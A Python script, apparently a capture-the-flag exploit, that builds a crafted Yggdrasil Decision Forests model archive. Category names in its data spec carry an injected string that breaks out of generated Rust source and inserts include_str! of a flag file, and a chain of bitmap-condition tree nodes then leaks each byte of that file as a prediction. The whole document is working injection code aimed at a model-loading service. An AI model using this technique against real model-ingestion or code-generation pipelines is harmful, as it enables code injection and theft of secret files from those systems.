import sys
from pathlib import Path
from typing import List
import struct
from zipfile import ZipFile
from yggdrasil_decision_forests.dataset import data_spec_pb2 as ds_pb
from yggdrasil_decision_forests.model import abstract_model_pb2 as am_pb
from yggdrasil_decision_forests.model.random_forest import random_forest_pb2 as rf_pb
from yggdrasil_decision_forests.model.decision_tree import decision_tree_pb2 as dt_pb

SPEC_PATH = "data_spec.pb"
HEADER_PATH = "header.pb"
FOREST_HEADER = "random_forest_header.pb"
NODES_HEADER = "nodes-00000-of-00001"

LEAK_FLAG_CHAR = '''")]\nOption{option_num} = include_str!("{flag_path}").as_bytes()[{index}] as isize, #[serde(rename = "some_kek_{index}'''

def generate_forest_header(path):
    output_file = path / FOREST_HEADER
    rf = rf_pb.Header()
    rf.num_trees = 1
    rf.node_format = "BLOB_SEQUENCE"
    with open(output_file, 'wb') as f:
        f.write(rf.SerializeToString())
    
def generate_data_spec(path: Path, flag_path: str, flag_len: int):
    output_file = path / SPEC_PATH
    spec = ds_pb.DataSpecification()
    target_column = spec.columns.add()
    target_column.name = "target"
    target_column.type = ds_pb.ColumnType.NUMERICAL
    target_column.numerical.min_value = 0
    
    poc_column = spec.columns.add()
    poc_column.name = "cat"
    poc_column.type = ds_pb.ColumnType.CATEGORICAL
    items = poc_column.categorical.items
    for i in range(flag_len):
        pld = LEAK_FLAG_CHAR.format(option_num=i + 5, index=i, flag_path=flag_path)
        items[f'char_{i}' + pld].index = 300 + i
    
    with open(output_file, 'wb') as f:
        f.write(spec.SerializeToString())

def encode_bitmap(variant: int) -> bytes:
    out = []
    fill = variant // 8
    for i in range(fill):
        out.append(0)
    res = variant % 8
    res = 1 << res
    out.append(res)
    return bytes(out)

def generate_answer_node(answer) -> dt_pb.Node:
    node = dt_pb.Node()
    node.regressor.top_value = float(answer)
    return node
    
def generate_nodes_for_number(variant: int, last_variant: int, leak_feature_index: int):
    if variant >= last_variant:
        yield generate_answer_node(-1)
        return
    cond_node = dt_pb.Node()
    cond_node.condition.attribute = leak_feature_index
    cond_node.condition.condition.contains_bitmap_condition.elements_bitmap = encode_bitmap(variant)
    yield cond_node
    yield from generate_nodes_for_number(variant + 1, last_variant, leak_feature_index)
    yield generate_answer_node(variant)
    return
    
    
def generate_poc_tree(path, leak_variants=None, leak_feature_index=1):
    output_file = path / NODES_HEADER
    
    with open(output_file, 'wb') as f:
        f.write(b'BS')
        version = struct.pack('H', 0)
        f.write(version)
        nop = struct.pack('I', 1337)
        f.write(nop)
        
        start = list(leak_variants)[0]
        end = list(leak_variants)[-1]
        for node in generate_nodes_for_number(start, end, leak_feature_index):
            ser = node.SerializeToString()
            ser_len = struct.pack('I', len(ser))
            f.write(ser_len)
            f.write(ser)
    

def generate_header(path):
    output_file = path / HEADER_PATH
    am = am_pb.AbstractModel()
    am.task = am_pb.REGRESSION
    am.label_col_idx = 0
    am.input_features.append(1)
    am.metadata.framework = "poc hack"
    print(am)
    with open(output_file, 'wb') as f:
        f.write(am.SerializeToString())
    
    

def generate_sploit_tree(path, flag_path, flag_len: int):
    generate_forest_header(path)
    generate_data_spec(path, flag_path, flag_len)
    generate_header(path)
    generate_poc_tree(path, range(1, 255), leak_feature_index=1)
    
def main(path_to_model: str, flag_path: str, flag_len: int):
    Path(path_to_model).mkdir(parents=True, exist_ok=True)
    generate_sploit_tree(Path(path_to_model), flag_path, flag_len)

    with ZipFile(path_to_model + ".zip", 'w') as myzip:
        for file in Path(path_to_model).rglob("*"):
            myzip.write(file, file.relative_to(path_to_model))
        

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2], int(sys.argv[3]))